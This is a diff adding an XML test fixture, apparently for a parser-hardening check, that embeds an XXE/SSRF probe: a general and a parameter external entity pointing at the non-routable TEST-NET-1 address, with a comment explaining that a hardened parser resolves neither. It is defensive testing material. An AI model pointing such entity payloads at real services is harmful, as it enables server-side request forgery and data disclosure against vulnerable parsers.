@@ -1,0 +1,13 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!-- XXE / SSRF probe: if the XML parser resolved external entities it would
+       fetch these URLs. 192.0.2.1 is TEST-NET-1 (RFC 5737, non-routable), so a
+       resolution attempt surfaces as a connect() in the egress drift-gate without
+       ever reaching a real host. A hardened parser resolves NONE of them. -->
+  <!ENTITY xxe SYSTEM "http://192.0.2.1:1/xxe-general">
+  <!ENTITY % pe SYSTEM "http://192.0.2.1:1/xxe-parameter.dtd">
+  %pe;
+]>
+<root>
+  <data>&xxe;</data>
+</root>
